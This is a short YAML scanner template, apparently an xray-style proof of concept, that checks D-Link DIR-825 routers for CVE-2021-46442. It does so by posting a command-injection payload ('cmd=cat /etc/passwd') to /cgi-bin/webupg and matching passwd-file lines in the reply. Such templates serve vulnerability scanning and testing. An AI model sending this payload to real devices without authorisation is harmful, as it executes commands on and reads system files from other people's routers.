name: poc-yaml-d-link-dir-825-cve-2021-46442
manual: true
transport: http
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /cgi-bin/webupg
            headers:
                Content-Type: application/x-www-form-urlencoded
                Referer: http://0.0.0.0/autoupgrade.asp
            body: name=shell&key=twmode&cmd=cat%20/etc/passwd
        expression: response.status == 200 && "root:[^:]*:[0-9]*:[0-9]*:[^:]*".bmatches(response.body)
expression: r1()
detail:
    author: xiaobaicai
    links:
        - https://github.com/tgp-top/D-Link-DIR-825
    vulnerability:
        id: CT-417662
        level: critical
    version: DIR-825(G1)：全部
